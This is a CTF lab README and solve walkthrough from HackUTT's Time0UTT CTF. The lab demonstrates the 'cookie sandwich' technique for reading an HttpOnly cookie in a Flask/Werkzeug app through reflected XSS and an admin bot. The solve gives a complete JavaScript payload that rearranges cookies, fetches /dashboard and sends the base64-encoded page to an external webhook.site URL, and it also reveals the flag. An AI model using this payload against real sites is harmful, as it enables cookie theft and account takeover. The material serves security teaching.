# Cookie Sandwich Technique Labs
This lab has been made for the 2nd edition of the Time0UTT CTF organised by the association HackUTT.
It aims to implement the "Cookie sandwich Technique" and force players to use this technique to catch an HttpOnly cookie.
For more information on this subject, refer to this article: `https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique`
**You're starting with credentials: `Emilien / Croissant123!`**

## Deployment

```bash
docker compose up --build -d
# → http://localhost:5002
```

## Vulerabilities

```
[ Joueur ]                    [ Serveur :5000 ]           [ Bot admin ]
    |                                |                          |
    | login Emilien                  |                          |
    |------------------------------> |                          |
    | <-- order_id (non-HttpOnly)    |                          |
    |    reflected in /dashboard     |                          |
    |                                |                          |
    | Rabbit hole : SQLi /recipes    |                          |
    |                                |                          |
    |                                |                          |
    |       ?note= reflected         |                          |
    | without escaping (|safe)       |                          |
    | → XSS with URL                 |                          |
    |                                |                          |
    | POST /signal?url=...XSS...     |                          |
    |------------------------------> | --- visiting URL ------> |
    |                                |   (bot auth              |
    |                                |    + secret_recipe       |
    |                                |    HttpOnly = FLAG)      |
    |                                |                          |
    |                                |   XSS :                  |
    |                                |   1. suppr order_id      |
    |                                |   2. set sandwich        |
    |                                |      order_id="pwn       |
    |                                |      dummy=end"          |
    |                                |   3. fetch /dashboard    |
    |                                | <- order_id reflected -> |
    |                                |    contain secret_recipe |
    |                                |   4. btoa(html) → exfil  |
    | <-- reception webhook ---------|--------------------------|
    | décode base64 → find flag    |
```

---

## Solve
### Step 1 - Understanding the Bot

The `/signal` page allows you to submit a URL.

An admin bot visits the submitted URL with an HttpOnly `secret_recipe` cookie containing the flag.

The submitted URL must be on `localhost:5002` (same domain) so that the bot's cookies are sent with the request.

### Step 2 - Understanding the Cookie Sandwich Technique

Flask/Werkzeug recognizes quoted cookie values (RFC2109).

If `order_id` starts with `"`, Werkzeug reads until the next `"` and includes all intermediate cookies in the value.

**Example:**
```text
Cookie sent:      order_id="pwn; secret_recipe=FLAG; dummy=end"
                  ─────────────────────────────────────────────
Werkzeug parses:  order_id = pwn; secret_recipe=FLAG; dummy=end
```

Flask then reflects this `order_id` in `/dashboard` → the flag appears in the page.

The `;` characters are encoded as octal `\073` by Werkzeug.

### Step 3 - Building the XSS Payload

The payload must execute in the **bot's** browser (same domain, same cookies).

```javascript
(async()=>{document.cookie='order_id=x;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';document.cookie='order_id=x;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/dashboard';document.cookie='dummy=x;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';document.cookie='order_id="pwn;path=/dashboard';document.cookie='dummy=end";path=/';const r=await fetch('/dashboard',{credentials:'include'});const t=await r.text();fetch('https://webhook.site/be768538-9185-4ae9-9780-300f8edec593',{method:'POST',mode:'no-cors',body:btoa(unescape(encodeURIComponent(t)))});})();
```

### Step 4 - Encoding and Submitting

Encode the payload for the URL (replace special characters):

```text
http://localhost:5002/dashboard?note=<script>PAYLOAD</script>
```

Ready-to-use version — paste it directly into the `/signal` field:

```text
http://localhost:5002/dashboard?note=<script>(async()=>{document.cookie='order_id=x;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';document.cookie='order_id=x;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/dashboard';document.cookie='dummy=x;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';document.cookie='order_id="pwn;path=/dashboard';document.cookie='dummy=end";path=/';const r=await fetch('/dashboard',{credentials:'include'});const t=await r.text();fetch('https://webhook.site/be768538-9185-4ae9-9780-300f8edec593',{method:'POST',mode:'no-cors',body:btoa(unescape(encodeURIComponent(t)))});})();</script>
```

### Step 5 - Reading the Result on webhook.site

After approximately 5 seconds, a request arrives on webhook.site with the `?d=` parameter.

**Decode the base64:**
```bash
echo "BASE64_HERE" | base64 -d > response.html
grep "order-id-value" response.html
```

**Result in the HTML:**
```text
Tracking number: pwn\073 secret_recipe=HackUTT{M4g1Cal_c00Ki3_57eaLing}\073 dummy=end
```

`\073` = octal encoding of `;` by Werkzeug.

**Flag: `HackUTT{M4g1Cal_c00Ki3_57eaLing}`**

---

